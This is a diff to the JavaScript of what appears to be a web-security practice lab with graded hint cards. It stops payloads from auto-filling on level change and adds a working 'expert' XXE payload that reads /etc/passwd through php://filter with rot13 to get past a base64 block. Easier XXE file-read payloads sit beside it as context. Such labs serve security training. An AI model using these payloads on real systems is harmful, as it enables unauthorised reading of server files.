@@ -155,9 +155,10 @@ function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
   var L2=document.getElementById('lvl_'+card+'2'); if(L2) L2.value=lvl;
   var d=PAYLOADS[card][lvl];
-  var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p;
+  var pl=document.getElementById('pl_'+card); if(pl){ pl.textContent=d.p; var _det=pl.closest('details'); if(_det) _det.open=false; }
   var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
-  var _inp=document.getElementById('in_'+card); if(_ready && _inp && card!=='up'){ _inp.value=d.p; try{_inp.dispatchEvent(new Event('input'));}catch(e){} }
+  // no auto-fill on level change: the payload enters the input only when the user opens the hint and
+  // clicks "use this ▶", and the hint collapses on each switch — so changing level never reveals the answer.
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
 PAYLOADS.rd={
@@ -170,13 +171,13 @@ PAYLOADS.xml={
  easy:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
  medium:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Medium — 'SYSTEM' blocked → use PUBLIC."},
  hard:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Hard — file:// blocked → php://filter, then base64-decode."},
- expert:{p:'(advanced) inline <!ENTITY is blocked → use an external DTD or parameter entities.',n:"Expert — inline entities blocked → external/parameter-entity DTD (advanced)."}
+ expert:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/read=string.rot13/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Expert — 'base64' blocked → use a different filter php://filter/read=string.rot13, then rot13 the output back."}
 };
 ['q','url','file','name','jwt','rd','xml'].forEach(function(c){ setLvl(c,'easy'); });
 _ready=true;
 /* quick-pick: descriptive one-click shortcuts under each card (select the level + fill the input; reuses setLvl) */
 var QLV=['easy','medium','hard','expert'];
-var QLABELS={q:['fingerprint','tables','dump','blind'],url:['localhost','127.1','decimal','octal'],file:['secret','/etc/passwd','source','rot13'],name:['<script>','<img>','<svg>','<animate>'],jwt:['alg:none','crack','crack+','SQLi-leak'],rd:['any host','query','subdomain','@userinfo'],xml:['SYSTEM','PUBLIC','php://filter','ext-DTD']};
+var QLABELS={q:['fingerprint','tables','dump','blind'],url:['localhost','127.1','decimal','octal'],file:['secret','/etc/passwd','source','rot13'],name:['<script>','<img>','<svg>','<animate>'],jwt:['alg:none','crack','crack+','SQLi-leak'],rd:['any host','query','subdomain','@userinfo'],xml:['SYSTEM','PUBLIC','php://filter','rot13']};
 Object.keys(QLABELS).forEach(function(card){
   var lvd=document.getElementById('lv_'+card); if(!lvd) return;
   var row=document.createElement('div'); row.style.cssText='margin:4px 0 2px';
